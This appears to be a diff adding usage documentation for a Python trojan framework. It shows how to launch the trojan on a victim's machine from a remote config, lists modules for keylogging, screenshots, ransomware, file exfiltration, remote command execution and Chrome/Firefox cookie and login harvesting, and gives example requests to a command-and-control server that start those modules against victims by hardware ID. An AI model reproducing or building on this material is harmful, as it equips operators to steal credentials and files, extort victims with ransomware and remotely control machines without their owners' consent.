@@ -1,0 +1,122 @@
+[ initializing and running the trojan on the client ]
+
+"main.py"
+
+	from trojan import Trojan
+
+	Trojan({}, 'https://site.com/raw/init-default-configs.json').run()
+
+-------------------
+
+[ config ]
+
+* see sample_usages/configs_test_1.json
+
+-------------------
+
+[ valid special substrings in config per module ]
+
+DropboxScreenshotter
+	`hwid`
+	`victim_username`
+
+DropboxKeylogger
+	`hwid`
+	`victim_username`
+
+DropboxRansomware
+	`hwid`
+	`encrypted_file_extension`
+	`decryptor_path`
+	`init_vector`
+	`email_address`
+	`victim_username`
+
+DropboxFileExfiltrator
+	`hwid`
+	`victim_username`
+
+DropboxCMDExecutor
+	`hwid`
+	`victim_username`
+
+DropboxChromeCookieHarvester
+	`hwid`
+	`victim_username`
+
+DropboxChromeLoginHarvester
+	`hwid`
+	`victim_username`
+
+DropboxFirefoxCookieHarvester
+	`hwid`
+	`victim_username`
+
+-------------------
+
+[ server requests ]
+
+All requests require an Auth Cookie.
+
+auth_cookie = {'auth': '<password here>'}
+
+* see sample_usages/trojan_test_c2.py
+
+---------
+
+Issuing Commands : `/command` POST
+
+e.g.
+	requests.post('https://c2-domain.com/command', cookies=auth_cookie, json={
+		'hwid': 'ABCD-EFGH-1234-5678',
+		'body': 'start DropboxFileExfiltrator'
+	})
+
+valid commands:
+	pass
+	die
+	start <module name>
+	config <direct url of new configs>
+	start_override <module name> <direct url of temp configs>
+
+---------
+
+Showing Clients Sorted by Last Ping  : `/status` GET
+
+e.g.
+	r = requests.get('https://c2-domain.com/status?max=5&order=desc')
+	print(r.text)
+
+query params:
+	max -- show top N clients only
+	order -- 'asc' or 'desc'
+
+---------
+
+Showing DB Entry of a Certain Client : `/info` GET
+
+e.g.
+	r = requests.get('https://c2-domain.com/info?hwid=ABCD-EFGH-IJKL-8887')
+	print(r.text)
+
+query params:
+	hwid -- specified client's hwid
+
+-------------------
+
+___________________
+
+
+Internals
+
+(WIP)
+
+Trojan Client:
+	- polls the server for new commands
+	- keeps an internal list of threads of running modules
+		- each time a module is run, it is put on the list
+		- each time it finishes, it is removed from the list
+
+___________________
+
+
